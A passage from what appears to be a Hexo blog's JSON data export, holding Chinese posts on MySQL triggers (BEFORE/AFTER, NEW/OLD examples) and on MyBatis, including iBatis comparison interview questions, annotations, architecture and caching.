对user表中插入前的数据进行拦截修改用户名为大写\n\tDELIMITER $$\n\tDROP TRIGGER IF EXISTS nameToUpperCase;\n\n\tCREATE TRIGGER nameToUpperCase BEFORE INSERT ON user FOR EACH ROW\n\t    BEGIN\n\t\tDECLARE upperName VARCHAR(20);\n\t\t/*\n\t\t对于insert 操作，只能修改插入的数据，而不能对数据库中原来的数据进行修改。\n\t\t即：只能操作NEW对象，不能操作OLD对象\n\t\t*/\n\t\tSET upperName = NEW.name;\n\t\tSELECT upper(upperName) INTO upperName;\n\t\tSET NEW.name = upperName;\n\t    END $$\n\n\tDELIMITER ;\n\n\t-- 向表中插入数据\n\tINSERT INTO user (name, age, gender, creator, create_time) VALUES (\"lowwer\", 22, \"boy\", 1, sysdate());\n\n\t-- 查询结果\n\tSELECT * FROM user WHERE age = 22;\n\n**总结：**\t\nAFTER：是在记录操纵之后触发，是先完成数据的增删改，再触发，触发的语句晚于监视的增删改操作，无法影响前面的增删改动作\nBEFORE：是在记录操纵之前触发，是先完成触发，再增删改，触发的语句先于监视的增删改，我们就有机会判断，修改即将发生的操作，如：我们在触发之前需要判断new值和old值的大小或关系，如果满足要求就触发，不通过就修改再触发；如：表之间定义的有外键，在删除主键时，必须要先删除外键表，这时就有先后之分，这里before相当于设置了断点，我们可以处理删除外键。\n\n\n#### 触发器中的NEW 和 OLD\n- INSERT语句, 只有NEW是合法的，因为是新添加数据；\n- DELETE语句，只有OLD才合法，因为没有新数据可以操作；\n- UPDATE语句，NEW、OLD可以同时使用。\n\n\t\tDELIMITER $$\n\t\tDROP TRIGGER IF EXISTS deleteTrigger;\n\t\tCREATE TRIGGER deleteTrigger AFTER DELETE ON user FOR EACH ROW\n\t\t    BEGIN\n\t\t\t/*\n\t\t\tDELETE 触发器在 DELETE 语句执行之前或之后执行。需要知道以下两点：\n\t\t\t1.在 DELETE 触发器代码内，你可以引用一个名为 OLD 的虚拟表，访问被删除的行；\n\t\t\t2.OLD 中的值全都是只读的，不能更新。下面的例子演示使用 OLD 保存将要被删除的行到一个存档表中：\n\t\t\t*/\n\t\t\tIF OLD.id = 2 THEN\n\t\t\t    -- 触发器不能在监控增删改的时候再更改同一张表\n\t\t\t    INSERT INTO course(name, teacher, type) VALUES (\"自然\", \"王小英\", 1);\n\t\t\tEND IF;\n\t\t    END $$\n\t\tDELIMITER ;\n\n\t\tDELETE FROM user WHERE id = 2;\n\t\t","slug":"MySql触发器","published":1,"updated":"2018-02-09T08:14:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw9001emfaho09qymr2","content":"<p>[TOC]</p>\n<h4 id=\"什么是触发器\"><a href=\"#什么是触发器\" class=\"headerlink\" title=\"什么是触发器\"></a>什么是触发器</h4><p>触发器，顾名思义是在触发了某个动作之后而执行的一串数据库脚本。主要是用在数据的增、删、改动作之上。触发器的执行是自动的，只要触发器中监听的动作发生了触发器就会自动执行。</p>\n<h4 id=\"触发器的定义\"><a href=\"#触发器的定义\" class=\"headerlink\" title=\"触发器的定义\"></a>触发器的定义</h4><pre><code>DROP TRIGGER IF EXISTS triggerName; -- just for update trigger\nCREATE TRIGGER triggerName BEFORE UPDATE\n  ON tableName FOR EACH ROW\n  BEGIN \n      -- to do something\n  END;\n</code></pre><h4 id=\"触发器中的BEFORE-和-AFTER\"><a href=\"#触发器中的BEFORE-和-AFTER\" class=\"headerlink\" title=\"触发器中的BEFORE 和 AFTER\"></a>触发器中的BEFORE 和 AFTER</h4><p>BEFORE：(INSERT、UPDATE)可以对NEW中的数据进行拦截<strong>修改</strong>，<br>AFTER：不能对NEW进行修改。<br>两者都不能修改OLD（<strong>只读</strong>）数据，但是可以获取到OLD中的数据。即，触发器不能修改原来表中的数据。</p>\n<pre><code>DELIMITER $$\nDROP TRIGGER IF EXISTS updateTrigger;\nCREATE TRIGGER updateTrigger BEFORE UPDATE ON user FOR EACH ROW\n    BEGIN\n    DECLARE oldName VARCHAR(20);\n    DECLARE newName VARCHAR(20);\n    -- 测试更新操作之前能否对拿到OLD和NEW的虚拟表对象\n    SET newName = NEW.name;\n    SET oldName = OLD.name;\n    IF newName IS NOT NULL AND oldName IS NOT NULL THEN\n        SET NEW .name = &quot;error name&quot;;\n    END IF;\n    END $$\n\nDELIMITER ;\n\n-- 验证\nUPDATE user SET name = &quot;zhangsan&quot; WHERE id = 4;\n-- 查看结果\nSELECT * FROM user WHERE id = 4;\n</code></pre><p><img src=\"imgs/20180209-161422.png\" alt=\"\"></p>\n<p><strong>实例：</strong></p>\n<pre><code>-- 对user表中插入前的数据进行拦截修改用户名为大写\nDELIMITER $$\nDROP TRIGGER IF EXISTS nameToUpperCase;\n\nCREATE TRIGGER nameToUpperCase BEFORE INSERT ON user FOR EACH ROW\n    BEGIN\n    DECLARE upperName VARCHAR(20);\n    /*\n    对于insert 操作，只能修改插入的数据，而不能对数据库中原来的数据进行修改。\n    即：只能操作NEW对象，不能操作OLD对象\n    */\n    SET upperName = NEW.name;\n    SELECT upper(upperName) INTO upperName;\n    SET NEW.name = upperName;\n    END $$\n\nDELIMITER ;\n\n-- 向表中插入数据\nINSERT INTO user (name, age, gender, creator, create_time) VALUES (&quot;lowwer&quot;, 22, &quot;boy&quot;, 1, sysdate());\n\n-- 查询结果\nSELECT * FROM user WHERE age = 22;\n</code></pre><p><strong>总结：</strong><br>AFTER：是在记录操纵之后触发，是先完成数据的增删改，再触发，触发的语句晚于监视的增删改操作，无法影响前面的增删改动作<br>BEFORE：是在记录操纵之前触发，是先完成触发，再增删改，触发的语句先于监视的增删改，我们就有机会判断，修改即将发生的操作，如：我们在触发之前需要判断new值和old值的大小或关系，如果满足要求就触发，不通过就修改再触发；如：表之间定义的有外键，在删除主键时，必须要先删除外键表，这时就有先后之分，这里before相当于设置了断点，我们可以处理删除外键。</p>\n<h4 id=\"触发器中的NEW-和-OLD\"><a href=\"#触发器中的NEW-和-OLD\" class=\"headerlink\" title=\"触发器中的NEW 和 OLD\"></a>触发器中的NEW 和 OLD</h4><ul>\n<li>INSERT语句, 只有NEW是合法的，因为是新添加数据；</li>\n<li>DELETE语句，只有OLD才合法，因为没有新数据可以操作；</li>\n<li><p>UPDATE语句，NEW、OLD可以同时使用。</p>\n<pre><code>DELIMITER $$\nDROP TRIGGER IF EXISTS deleteTrigger;\nCREATE TRIGGER deleteTrigger AFTER DELETE ON user FOR EACH ROW\n    BEGIN\n    /*\n    DELETE 触发器在 DELETE 语句执行之前或之后执行。需要知道以下两点：\n    1.在 DELETE 触发器代码内，你可以引用一个名为 OLD 的虚拟表，访问被删除的行；\n    2.OLD 中的值全都是只读的，不能更新。下面的例子演示使用 OLD 保存将要被删除的行到一个存档表中：\n    */\n    IF OLD.id = 2 THEN\n        -- 触发器不能在监控增删改的时候再更改同一张表\n        INSERT INTO course(name, teacher, type) VALUES (&quot;自然&quot;, &quot;王小英&quot;, 1);\n    END IF;\n    END $$\nDELIMITER ;\n\nDELETE FROM user WHERE id = 2;\n</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>[TOC]</p>\n<h4 id=\"什么是触发器\"><a href=\"#什么是触发器\" class=\"headerlink\" title=\"什么是触发器\"></a>什么是触发器</h4><p>触发器，顾名思义是在触发了某个动作之后而执行的一串数据库脚本。主要是用在数据的增、删、改动作之上。触发器的执行是自动的，只要触发器中监听的动作发生了触发器就会自动执行。</p>\n<h4 id=\"触发器的定义\"><a href=\"#触发器的定义\" class=\"headerlink\" title=\"触发器的定义\"></a>触发器的定义</h4><pre><code>DROP TRIGGER IF EXISTS triggerName; -- just for update trigger\nCREATE TRIGGER triggerName BEFORE UPDATE\n  ON tableName FOR EACH ROW\n  BEGIN \n      -- to do something\n  END;\n</code></pre><h4 id=\"触发器中的BEFORE-和-AFTER\"><a href=\"#触发器中的BEFORE-和-AFTER\" class=\"headerlink\" title=\"触发器中的BEFORE 和 AFTER\"></a>触发器中的BEFORE 和 AFTER</h4><p>BEFORE：(INSERT、UPDATE)可以对NEW中的数据进行拦截<strong>修改</strong>，<br>AFTER：不能对NEW进行修改。<br>两者都不能修改OLD（<strong>只读</strong>）数据，但是可以获取到OLD中的数据。即，触发器不能修改原来表中的数据。</p>\n<pre><code>DELIMITER $$\nDROP TRIGGER IF EXISTS updateTrigger;\nCREATE TRIGGER updateTrigger BEFORE UPDATE ON user FOR EACH ROW\n    BEGIN\n    DECLARE oldName VARCHAR(20);\n    DECLARE newName VARCHAR(20);\n    -- 测试更新操作之前能否对拿到OLD和NEW的虚拟表对象\n    SET newName = NEW.name;\n    SET oldName = OLD.name;\n    IF newName IS NOT NULL AND oldName IS NOT NULL THEN\n        SET NEW .name = &quot;error name&quot;;\n    END IF;\n    END $$\n\nDELIMITER ;\n\n-- 验证\nUPDATE user SET name = &quot;zhangsan&quot; WHERE id = 4;\n-- 查看结果\nSELECT * FROM user WHERE id = 4;\n</code></pre><p><img src=\"imgs/20180209-161422.png\" alt=\"\"></p>\n<p><strong>实例：</strong></p>\n<pre><code>-- 对user表中插入前的数据进行拦截修改用户名为大写\nDELIMITER $$\nDROP TRIGGER IF EXISTS nameToUpperCase;\n\nCREATE TRIGGER nameToUpperCase BEFORE INSERT ON user FOR EACH ROW\n    BEGIN\n    DECLARE upperName VARCHAR(20);\n    /*\n    对于insert 操作，只能修改插入的数据，而不能对数据库中原来的数据进行修改。\n    即：只能操作NEW对象，不能操作OLD对象\n    */\n    SET upperName = NEW.name;\n    SELECT upper(upperName) INTO upperName;\n    SET NEW.name = upperName;\n    END $$\n\nDELIMITER ;\n\n-- 向表中插入数据\nINSERT INTO user (name, age, gender, creator, create_time) VALUES (&quot;lowwer&quot;, 22, &quot;boy&quot;, 1, sysdate());\n\n-- 查询结果\nSELECT * FROM user WHERE age = 22;\n</code></pre><p><strong>总结：</strong><br>AFTER：是在记录操纵之后触发，是先完成数据的增删改，再触发，触发的语句晚于监视的增删改操作，无法影响前面的增删改动作<br>BEFORE：是在记录操纵之前触发，是先完成触发，再增删改，触发的语句先于监视的增删改，我们就有机会判断，修改即将发生的操作，如：我们在触发之前需要判断new值和old值的大小或关系，如果满足要求就触发，不通过就修改再触发；如：表之间定义的有外键，在删除主键时，必须要先删除外键表，这时就有先后之分，这里before相当于设置了断点，我们可以处理删除外键。</p>\n<h4 id=\"触发器中的NEW-和-OLD\"><a href=\"#触发器中的NEW-和-OLD\" class=\"headerlink\" title=\"触发器中的NEW 和 OLD\"></a>触发器中的NEW 和 OLD</h4><ul>\n<li>INSERT语句, 只有NEW是合法的，因为是新添加数据；</li>\n<li>DELETE语句，只有OLD才合法，因为没有新数据可以操作；</li>\n<li><p>UPDATE语句，NEW、OLD可以同时使用。</p>\n<pre><code>DELIMITER $$\nDROP TRIGGER IF EXISTS deleteTrigger;\nCREATE TRIGGER deleteTrigger AFTER DELETE ON user FOR EACH ROW\n    BEGIN\n    /*\n    DELETE 触发器在 DELETE 语句执行之前或之后执行。需要知道以下两点：\n    1.在 DELETE 触发器代码内，你可以引用一个名为 OLD 的虚拟表，访问被删除的行；\n    2.OLD 中的值全都是只读的，不能更新。下面的例子演示使用 OLD 保存将要被删除的行到一个存档表中：\n    */\n    IF OLD.id = 2 THEN\n        -- 触发器不能在监控增删改的时候再更改同一张表\n        INSERT INTO course(name, teacher, type) VALUES (&quot;自然&quot;, &quot;王小英&quot;, 1);\n    END IF;\n    END $$\nDELIMITER ;\n\nDELETE FROM user WHERE id = 2;\n</code></pre></li>\n</ul>\n"},{"title":"Mybatis和IBatis的区别","date":"2017-03-30T08:04:08.000Z","_content":"\n1. Mybatis比IBatis比较大的几个改进是什么\n\n        a.有接口绑定,包括注解绑定sql和xml绑定Sql ,\n        b.动态sql由原来的节点配置变成OGNL表达式,\n        c. 在一对一,一对多的时候引进了association,在一对多的时候引入了collection节点,不过都是在resultMap里面配置\n\n2. 什么是MyBatis的接口绑定,有什么好处\n\n        接口映射就是在IBatis中任意定义接口,然后把接口里面的方法和SQL语句绑定,我们直接调用接口方法就可以,这样比起原来了SqlSession提供的方法我们可以有更加灵活的选择和设置.\n\n3. 接口绑定有几种实现方式,分别是怎么实现的?\n\n        接口绑定有两种实现方式,一种是通过注解绑定,就是在接口的方法上面加上\n        @Select@Update等注解里面包含Sql语句来绑定,另外一种就是通过xml里面写SQL来绑定,在这种情况下,要指定xml映射文件里面的namespace必须为接口的全路径名.\n\n4. 什么情况下用注解绑定,什么情况下用xml绑定\n\n        当Sql语句比较简单时候,用注解绑定,\n        当SQL语句比较复杂时候,用xml绑定,一般用xml绑定的比较多\n\n5. MyBatis实现一对一有几种方式?具体怎么操作的\n\n        有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,\n        通过在resultMap里面配置association节点配置一对一的类就可以完成;\n        嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过association配置,但另外一个表的查询通过select属性配置\n\n6. MyBatis实现一对多有几种方式,怎么操作的\n\n        有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,通过在resultMap里面配置collection节点配置一对多的类就可以完成;\n        嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过配置collection,但另外一个表的查询通过select节点配置\n\n7. MyBatis里面的动态Sql是怎么设定的?用什么语法?\n\n        MyBatis里面的动态Sql一般是通过if节点来实现,通过OGNL语法来实现,但是如果要写的完整,必须配合where,trim节点,where节点是判断包含节点有内容就插入where,否则不插入,trim节点是用来判断如果动态语句是以and 或or开始,那么会自动把这个and或者or取掉\n\n8. IBatis和MyBatis在核心处理类分别叫什么\n\n        IBatis里面的核心处理类交SqlMapClient,\n        MyBatis里面的核心处理类叫做SqlSession\n\n9. IBatis和MyBatis在细节上的不同有哪些\n\n        在sql里面变量命名有原来的#变量# 变成了#{变量} \n        原来的$变量$变成了${变量},\n        原来在sql节点里面的class都换名字交type\n        原来的queryForObject queryForList 变成了selectOne selectList \n        原来的别名设置在映射文件里面放在了核心配置文件里\n\n10. 讲下MyBatis的缓存\n\n        MyBatis的缓存分为一级缓存和二级缓存,\n        一级缓存放在session里面,默认就有,二级缓存放在它的命名空间里,默认是打开的,\n        使用二级缓存属性类需要实现Serializable序列化接\n        口(可用来保存对象的状态),可在它的映射文件中配置<cache/>\n\n11. MyBatis(IBatis)的好处是什么\n\n        ibatis把sql语句从Java源程序中独立出来，\n        放在单独的XML文件中编写，给程序的维护带来了很大便利。\n        ibatis封装了底层JDBC API的调用细节，并能自动将结果集转换成Java Bean对象，\n        大大简化了Java数据库编程的重复工作。\n        因为Ibatis需要程序员自己去编写sql语句，\n        程序员可以结合数据库自身的特点灵活控制sql语句，\n        因此能够实现比hibernate等全自动orm框架更高的查询效率，能够完成复杂查询。.","source":"_posts/Mybatis和IBatis的区别.md","raw":"---\ntitle: Mybatis和IBatis的区别\ndate: 2017-03-30 16:04:08\ntags: Mybatis\n---\n\n1. Mybatis比IBatis比较大的几个改进是什么\n\n        a.有接口绑定,包括注解绑定sql和xml绑定Sql ,\n        b.动态sql由原来的节点配置变成OGNL表达式,\n        c. 在一对一,一对多的时候引进了association,在一对多的时候引入了collection节点,不过都是在resultMap里面配置\n\n2. 什么是MyBatis的接口绑定,有什么好处\n\n        接口映射就是在IBatis中任意定义接口,然后把接口里面的方法和SQL语句绑定,我们直接调用接口方法就可以,这样比起原来了SqlSession提供的方法我们可以有更加灵活的选择和设置.\n\n3. 接口绑定有几种实现方式,分别是怎么实现的?\n\n        接口绑定有两种实现方式,一种是通过注解绑定,就是在接口的方法上面加上\n        @Select@Update等注解里面包含Sql语句来绑定,另外一种就是通过xml里面写SQL来绑定,在这种情况下,要指定xml映射文件里面的namespace必须为接口的全路径名.\n\n4. 什么情况下用注解绑定,什么情况下用xml绑定\n\n        当Sql语句比较简单时候,用注解绑定,\n        当SQL语句比较复杂时候,用xml绑定,一般用xml绑定的比较多\n\n5. MyBatis实现一对一有几种方式?具体怎么操作的\n\n        有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,\n        通过在resultMap里面配置association节点配置一对一的类就可以完成;\n        嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过association配置,但另外一个表的查询通过select属性配置\n\n6. MyBatis实现一对多有几种方式,怎么操作的\n\n        有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,通过在resultMap里面配置collection节点配置一对多的类就可以完成;\n        嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过配置collection,但另外一个表的查询通过select节点配置\n\n7. MyBatis里面的动态Sql是怎么设定的?用什么语法?\n\n        MyBatis里面的动态Sql一般是通过if节点来实现,通过OGNL语法来实现,但是如果要写的完整,必须配合where,trim节点,where节点是判断包含节点有内容就插入where,否则不插入,trim节点是用来判断如果动态语句是以and 或or开始,那么会自动把这个and或者or取掉\n\n8. IBatis和MyBatis在核心处理类分别叫什么\n\n        IBatis里面的核心处理类交SqlMapClient,\n        MyBatis里面的核心处理类叫做SqlSession\n\n9. IBatis和MyBatis在细节上的不同有哪些\n\n        在sql里面变量命名有原来的#变量# 变成了#{变量} \n        原来的$变量$变成了${变量},\n        原来在sql节点里面的class都换名字交type\n        原来的queryForObject queryForList 变成了selectOne selectList \n        原来的别名设置在映射文件里面放在了核心配置文件里\n\n10. 讲下MyBatis的缓存\n\n        MyBatis的缓存分为一级缓存和二级缓存,\n        一级缓存放在session里面,默认就有,二级缓存放在它的命名空间里,默认是打开的,\n        使用二级缓存属性类需要实现Serializable序列化接\n        口(可用来保存对象的状态),可在它的映射文件中配置<cache/>\n\n11. MyBatis(IBatis)的好处是什么\n\n        ibatis把sql语句从Java源程序中独立出来，\n        放在单独的XML文件中编写，给程序的维护带来了很大便利。\n        ibatis封装了底层JDBC API的调用细节，并能自动将结果集转换成Java Bean对象，\n        大大简化了Java数据库编程的重复工作。\n        因为Ibatis需要程序员自己去编写sql语句，\n        程序员可以结合数据库自身的特点灵活控制sql语句，\n        因此能够实现比hibernate等全自动orm框架更高的查询效率，能够完成复杂查询。.","slug":"Mybatis和IBatis的区别","published":1,"updated":"2018-01-31T05:30:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twa001gmfah9entbjtl","content":"<ol>\n<li><p>Mybatis比IBatis比较大的几个改进是什么</p>\n<pre><code>a.有接口绑定,包括注解绑定sql和xml绑定Sql ,\nb.动态sql由原来的节点配置变成OGNL表达式,\nc. 在一对一,一对多的时候引进了association,在一对多的时候引入了collection节点,不过都是在resultMap里面配置\n</code></pre></li>\n<li><p>什么是MyBatis的接口绑定,有什么好处</p>\n<pre><code>接口映射就是在IBatis中任意定义接口,然后把接口里面的方法和SQL语句绑定,我们直接调用接口方法就可以,这样比起原来了SqlSession提供的方法我们可以有更加灵活的选择和设置.\n</code></pre></li>\n<li><p>接口绑定有几种实现方式,分别是怎么实现的?</p>\n<pre><code>接口绑定有两种实现方式,一种是通过注解绑定,就是在接口的方法上面加上\n@Select@Update等注解里面包含Sql语句来绑定,另外一种就是通过xml里面写SQL来绑定,在这种情况下,要指定xml映射文件里面的namespace必须为接口的全路径名.\n</code></pre></li>\n<li><p>什么情况下用注解绑定,什么情况下用xml绑定</p>\n<pre><code>当Sql语句比较简单时候,用注解绑定,\n当SQL语句比较复杂时候,用xml绑定,一般用xml绑定的比较多\n</code></pre></li>\n<li><p>MyBatis实现一对一有几种方式?具体怎么操作的</p>\n<pre><code>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,\n通过在resultMap里面配置association节点配置一对一的类就可以完成;\n嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过association配置,但另外一个表的查询通过select属性配置\n</code></pre></li>\n<li><p>MyBatis实现一对多有几种方式,怎么操作的</p>\n<pre><code>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,通过在resultMap里面配置collection节点配置一对多的类就可以完成;\n嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过配置collection,但另外一个表的查询通过select节点配置\n</code></pre></li>\n<li><p>MyBatis里面的动态Sql是怎么设定的?用什么语法?</p>\n<pre><code>MyBatis里面的动态Sql一般是通过if节点来实现,通过OGNL语法来实现,但是如果要写的完整,必须配合where,trim节点,where节点是判断包含节点有内容就插入where,否则不插入,trim节点是用来判断如果动态语句是以and 或or开始,那么会自动把这个and或者or取掉\n</code></pre></li>\n<li><p>IBatis和MyBatis在核心处理类分别叫什么</p>\n<pre><code>IBatis里面的核心处理类交SqlMapClient,\nMyBatis里面的核心处理类叫做SqlSession\n</code></pre></li>\n<li><p>IBatis和MyBatis在细节上的不同有哪些</p>\n<pre><code>在sql里面变量命名有原来的#变量# 变成了#{变量} \n原来的$变量$变成了${变量},\n原来在sql节点里面的class都换名字交type\n原来的queryForObject queryForList 变成了selectOne selectList \n原来的别名设置在映射文件里面放在了核心配置文件里\n</code></pre></li>\n<li><p>讲下MyBatis的缓存</p>\n<pre><code>MyBatis的缓存分为一级缓存和二级缓存,\n一级缓存放在session里面,默认就有,二级缓存放在它的命名空间里,默认是打开的,\n使用二级缓存属性类需要实现Serializable序列化接\n口(可用来保存对象的状态),可在它的映射文件中配置&lt;cache/&gt;\n</code></pre></li>\n<li><p>MyBatis(IBatis)的好处是什么</p>\n<pre><code>ibatis把sql语句从Java源程序中独立出来，\n放在单独的XML文件中编写，给程序的维护带来了很大便利。\nibatis封装了底层JDBC API的调用细节，并能自动将结果集转换成Java Bean对象，\n大大简化了Java数据库编程的重复工作。\n因为Ibatis需要程序员自己去编写sql语句，\n程序员可以结合数据库自身的特点灵活控制sql语句，\n因此能够实现比hibernate等全自动orm框架更高的查询效率，能够完成复杂查询。.\n</code></pre></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>Mybatis比IBatis比较大的几个改进是什么</p>\n<pre><code>a.有接口绑定,包括注解绑定sql和xml绑定Sql ,\nb.动态sql由原来的节点配置变成OGNL表达式,\nc. 在一对一,一对多的时候引进了association,在一对多的时候引入了collection节点,不过都是在resultMap里面配置\n</code></pre></li>\n<li><p>什么是MyBatis的接口绑定,有什么好处</p>\n<pre><code>接口映射就是在IBatis中任意定义接口,然后把接口里面的方法和SQL语句绑定,我们直接调用接口方法就可以,这样比起原来了SqlSession提供的方法我们可以有更加灵活的选择和设置.\n</code></pre></li>\n<li><p>接口绑定有几种实现方式,分别是怎么实现的?</p>\n<pre><code>接口绑定有两种实现方式,一种是通过注解绑定,就是在接口的方法上面加上\n@Select@Update等注解里面包含Sql语句来绑定,另外一种就是通过xml里面写SQL来绑定,在这种情况下,要指定xml映射文件里面的namespace必须为接口的全路径名.\n</code></pre></li>\n<li><p>什么情况下用注解绑定,什么情况下用xml绑定</p>\n<pre><code>当Sql语句比较简单时候,用注解绑定,\n当SQL语句比较复杂时候,用xml绑定,一般用xml绑定的比较多\n</code></pre></li>\n<li><p>MyBatis实现一对一有几种方式?具体怎么操作的</p>\n<pre><code>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,\n通过在resultMap里面配置association节点配置一对一的类就可以完成;\n嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过association配置,但另外一个表的查询通过select属性配置\n</code></pre></li>\n<li><p>MyBatis实现一对多有几种方式,怎么操作的</p>\n<pre><code>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,通过在resultMap里面配置collection节点配置一对多的类就可以完成;\n嵌套查询是先查一个表,根据这个表里面的结果的外键id,去再另外一个表里面查询数据,也是通过配置collection,但另外一个表的查询通过select节点配置\n</code></pre></li>\n<li><p>MyBatis里面的动态Sql是怎么设定的?用什么语法?</p>\n<pre><code>MyBatis里面的动态Sql一般是通过if节点来实现,通过OGNL语法来实现,但是如果要写的完整,必须配合where,trim节点,where节点是判断包含节点有内容就插入where,否则不插入,trim节点是用来判断如果动态语句是以and 或or开始,那么会自动把这个and或者or取掉\n</code></pre></li>\n<li><p>IBatis和MyBatis在核心处理类分别叫什么</p>\n<pre><code>IBatis里面的核心处理类交SqlMapClient,\nMyBatis里面的核心处理类叫做SqlSession\n</code></pre></li>\n<li><p>IBatis和MyBatis在细节上的不同有哪些</p>\n<pre><code>在sql里面变量命名有原来的#变量# 变成了#{变量} \n原来的$变量$变成了${变量},\n原来在sql节点里面的class都换名字交type\n原来的queryForObject queryForList 变成了selectOne selectList \n原来的别名设置在映射文件里面放在了核心配置文件里\n</code></pre></li>\n<li><p>讲下MyBatis的缓存</p>\n<pre><code>MyBatis的缓存分为一级缓存和二级缓存,\n一级缓存放在session里面,默认就有,二级缓存放在它的命名空间里,默认是打开的,\n使用二级缓存属性类需要实现Serializable序列化接\n口(可用来保存对象的状态),可在它的映射文件中配置&lt;cache/&gt;\n</code></pre></li>\n<li><p>MyBatis(IBatis)的好处是什么</p>\n<pre><code>ibatis把sql语句从Java源程序中独立出来，\n放在单独的XML文件中编写，给程序的维护带来了很大便利。\nibatis封装了底层JDBC API的调用细节，并能自动将结果集转换成Java Bean对象，\n大大简化了Java数据库编程的重复工作。\n因为Ibatis需要程序员自己去编写sql语句，\n程序员可以结合数据库自身的特点灵活控制sql语句，\n因此能够实现比hibernate等全自动orm框架更高的查询效率，能够完成复杂查询。.\n</code></pre></li>\n</ol>\n"},{"title":"Mybatis常用注解整理","date":"2018-01-02T01:11:49.000Z","_content":"\n@RequestBody: 要求请求体是json格式\n@RequestMapping(value: 请求路径, method: 请求方法类型, produces: 接收的数据类型，对应的是content-type头信息): 请求路径映射\n@ResponseBody: 返回值转换成json格式\n\n","source":"_posts/Mybatis常用注解整理.md","raw":"---\ntitle: Mybatis常用注解整理\ndate: 2018-01-02 09:11:49\ntags: JavaEE\n---\n\n@RequestBody: 要求请求体是json格式\n@RequestMapping(value: 请求路径, method: 请求方法类型, produces: 接收的数据类型，对应的是content-type头信息): 请求路径映射\n@ResponseBody: 返回值转换成json格式\n\n","slug":"Mybatis常用注解整理","published":1,"updated":"2018-01-02T09:18:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twa001hmfah0qivqqyu","content":"<p>@RequestBody: 要求请求体是json格式<br>@RequestMapping(value: 请求路径, method: 请求方法类型, produces: 接收的数据类型，对应的是content-type头信息): 请求路径映射<br>@ResponseBody: 返回值转换成json格式</p>\n","site":{"data":{}},"excerpt":"","more":"<p>@RequestBody: 要求请求体是json格式<br>@RequestMapping(value: 请求路径, method: 请求方法类型, produces: 接收的数据类型，对应的是content-type头信息): 请求路径映射<br>@ResponseBody: 返回值转换成json格式</p>\n"},{"title":"Mybatis面试总结","date":"2017-03-31T02:05:57.000Z","_content":"#### 什么是Mybatis\n&emsp;&emsp;Mybatis是对JDBC封装的优秀的数据持久层框架,让我们在开发中只关注SQL的封装,而不必关注其他事情\n\n#### Mybatis总体架构图\n![Mybatis](Mybatis面试总结/1.png)\n**SqlMapConfig.xml:**\n&emsp;&emsp;此文件作为Mybatis的全局配置文件,配置了Mybatis的运行环境等等\n**mapper.xml:**\n&emsp;&emsp;配置了一些sql语句,需要在SqlMapConfig.xml中进行加载\n**SqlSessionFactory:**\n&emsp;&emsp;Mybatis的绘画工厂,由SqlMapConfig进行创建\n**sqlSession:**\n&emsp;&emsp;操作数据库的基本单元,由绘画工厂创建\n**Excuter:**\n&emsp;&emsp;Mybatis底层定义了执行器Excuter操作数据库,Excuter的实现有两个,一个是基本执行器,一个是缓存执行器\n**Mapped Statment:**\n&emsp;&emsp;Mapped Statment也是Mybatis的一个底层对象,包括了Mybatis的配置信息和Sql映射信息,Mapper.xml一个sql对应一个statment\n&emsp;&emsp;mapped Statmet对输入的参数映射到sql语句中叫做输入映射\n&emsp;&emsp;mapped Statment负责将查询出来的结果集映射到java对象中,叫做输出映射\n\n#### Mybatis与Hibernat的区别:\n&emsp;&emsp;Mybatis是一个不完全的ORM框架,它注重的是对SQL的封装,要求程序员进行配置SQL,并将java对象和SQL之间进行输入和输出映射, 而Hibernat是一个完全的ORM框架,它关心的是表和对象之间的映射关系\n&emsp;&emsp;Mybatis比较轻便,易于上手,而Hibernat的学习成本比较大,需要精通更难\n\n#### Mapper代理方式开发DAO\n&emsp;&emsp;Mapper.xml文件中的namespace与mapper接口的类路径相同。\n&emsp;&emsp;Mapper接口方法名和Mapper.xml中定义的每个statement的id相同\n&emsp;&emsp;Mapper接口方法的输入参数类型和mapper.xml中定义的每个sql 的parameterType的类型相同\n&emsp;&emsp;Mapper接口方法的输出参数类型和mapper.xml中定义的每个sql的resultType的类型相同\n\n#### Mybatis的一级缓存\n![Mybatis](Mybatis面试总结/2.png)\n\n &emsp;&emsp;一级缓存区域是根据SqlSession为单位划分的Mybatis内部存储缓存使用一个HashMap，每个sqlSession对象使用一个map存储缓存数据，map的key唯一标识一个sql语句，key对应的value是从数据库查询出来数据映射生成的java对象。 sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域。\n#### Mybatis的二级缓存\n![Mybatis](Mybatis面试总结/3.png)\n &emsp;&emsp;二级缓存区域是根据mapper的namespace划分的，相同namespace的mapper查询数据放在同一个区域，如果使用mapper代理方法每个mapper的namespace都不同，此时可以理解\n &emsp;&emsp;为二级缓存区域是根据mapper划分。\n &emsp;&emsp;每次查询会先从缓存区域找，如果找不到从数据库查询，查询到数据将数据写入缓存。Mybatis内部存储缓存使用一个HashMap，每个mapper映射文件(以namespace为单位)对应一个map，\n &emsp;&emsp;map的key唯一标识一个sql语句，key对应的value是从数据查询出来数据映射生成的java对象。\n &emsp;&emsp;sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域\n\n**Mybatis二级缓存的局限性**\n 